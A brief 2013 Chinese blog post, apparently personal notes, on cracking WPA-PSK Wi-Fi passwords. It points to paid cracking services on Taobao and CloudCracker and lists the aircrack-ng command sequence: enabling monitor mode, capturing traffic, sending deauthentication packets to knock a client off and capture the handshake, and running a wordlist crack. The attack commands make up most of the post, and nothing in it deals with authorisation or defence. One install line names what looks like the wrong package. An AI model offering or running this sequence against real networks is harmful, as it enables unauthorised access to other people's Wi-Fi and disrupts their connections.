---
author: bccsafe
comments: true
date: 2013-02-16 14:16:47+00:00
layout: post
slug: '%e7%a0%b4%e8%a7%a3wpa-psk%e5%8a%a0%e5%af%86%e6%97%a0%e7%ba%bf%e7%bd%91%e7%bb%9c'
title: 破解WPA-PSK加密无线网络
wordpress_id: 144
categories:
- wp_bt5 学习笔记 
---

破解WPA-PSK加密无线网络

备忘- -记下来...

破解的话还是让别人搞好了

淘宝搜索“跑包”就有，大概10块1次 成功了才收费 不成功么1快或者不收...

更专业的跑包么  国外的站CloudCracker 不过人家收的是美元- -还很贵...

[https://www.cloudcracker.com/](https://www.cloudcracker.com/)

   
    apt-get install mirmon
    ifconfig
    airmon-ng start wlan0 6
    airodump-ng -w nenew -c (channel) --bssid (AP‘s MAC) mon0
    aireplay-ng -0 10 -a (AP’s MAC) -c (CP’s MAC) mon0
    成功标识： WAP Handshake
    aircrack-ng -w (wordlist) -b AP’s MAC (xx.cap)


以上仅为自家备份用

详细教程请参考[http://netsecurity.51cto.com/art/201105/264844.htm](http://netsecurity.51cto.com/art/201105/264844.htm)


